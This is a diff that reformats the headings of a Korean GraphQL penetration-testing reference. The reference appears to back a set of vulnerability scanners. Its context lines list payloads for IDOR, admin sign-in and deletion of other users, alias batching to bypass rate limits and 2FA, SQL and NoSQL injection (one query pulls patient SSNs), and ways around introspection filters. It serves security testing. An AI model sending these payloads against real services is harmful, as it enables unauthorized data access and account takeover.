@@ -31,40 +31,40 @@ Introspection 전체 dump:
 
 ### 기본 페이로드
 
-**Query (shorthand / 명시):**
+#### Query (shorthand / 명시)
 ```
 { user { id name } }
 query { user { id name } }
 ```
 
-**Query with arguments:**
+#### Query with arguments
 - `{ user(id: "1") { name email } }` (body) — IDOR 진입점
 - `{ user(id: "1' OR '1'='1") { id } }` (body) — SQLi 가능 sink (sqli-scanner 결합)
 
-**Nested query (관계 traversal):**
+#### Nested query (관계 traversal)
 ```
 { user(id:"1") { name posts { title comments { content author { email } } } } }
 ```
 
-**Mutation (인증/상태 변경):**
+#### Mutation (인증/상태 변경)
 ```
 mutation { signIn(login:"admin", password:"any"){ token } }
 mutation { addUser(id:"1", name:"x", email:"x@x.com"){ id } }
 mutation { deleteUser(id:"OTHER_USER_ID") }
 ```
 
-**Subscription (인증 우회 채널):**
+#### Subscription (인증 우회 채널)
 ```
 subscription { newMessage { id content sender } }
 subscription { userUpdates(userId:"OTHER") { email } }
 ```
 
-**JSON list batching:**
+#### JSON list batching
 ```
 [{"query":"{user(id:\"1\"){name}}"},{"query":"{user(id:\"2\"){name}}"},{"query":"{user(id:\"3\"){name}}"}]
 ```
 
-**Alias batching (rate limit/2FA 우회):**
+#### Alias batching (rate limit/2FA 우회)
 ```
 mutation {
   login(pass:1111, username:"bob")
@@ -74,16 +74,16 @@ mutation {
 }
 ```
 
-**Query name based batching:**
+#### Query name based batching
 ```
 {"query":"query { qname: Query { field1 } qname1: Query { field1 } }"}
 ```
 
-**Field에 SQL injection (sqli-scanner 결합):**
+#### Field에 SQL injection (sqli-scanner 결합)
 - `{ bacon(id:"1'") { id type price } }` — single quote
 - `{ user(name:"x';SELECT pg_sleep(5);--") { id email } }` — Time-based
 
-**Field에 NoSQL injection (nosqli-scanner 결합):**
+#### Field에 NoSQL injection (nosqli-scanner 결합)
 ```
 { doctors(
     options:"{\"limit\":1,\"patients.ssn\":1}",
@@ -91,21 +91,21 @@ mutation {
   ) { firstName lastName id patients{ssn} } }
 ```
 
-**`node(id:)` global resolver (Relay):**
+#### `node(id:)` global resolver (Relay)
 - `{ node(id:"VXNlcjox") { ...on User { email phone } } }` — Base64 ID로 임의 타입
 - `{ node(id:"QWRtaW46MQ==") { ...on Admin { secrets } } }`
 
-**JSON scalar 인젝션:**
+#### JSON scalar 인젝션
 - `{ search(filter:{role:{$ne:"none"}}) { id } }` — scalar JSON에 NoSQL 연산자
 
-**File upload (multipart spec, graphql-upload):**
+#### File upload (multipart spec, graphql-upload)
 ```
 operations: {"query":"mutation($f:Upload!){singleUpload(file:$f){id}}","variables":{"f":null}}
 map: {"0":["variables.f"]}
 0: <파일>
 ```
 
-**WebSocket subscription (graphql-ws):**
+#### WebSocket subscription (graphql-ws)
 ```
 {"type":"connection_init","payload":{}}
 {"type":"subscribe","id":"1","payload":{"query":"subscription{userUpdates{id email}}"}}
@@ -131,7 +131,7 @@ map: {"0":["variables.f"]}
 | Field-level 인가 | 중첩 resolver `{user{posts{owner{...}}}}` — outer만 인가하면 inner 노출 |
 | `crit` extension 무시 | `@defer`, `@stream` directive로 응답 분할 — 중간 평가 우회 |
 
-**인코딩/syntax 변형 우회:**
+#### 인코딩/syntax 변형 우회
 - URL encoding: `query=%7B__schema%7Btypes%7Bname%7D%7D%7D`
 - Unicode escape in field name: `__\u0073chema`
 - Inline fragment 활용: `{...on User{email}}` — 타입 검사 우회
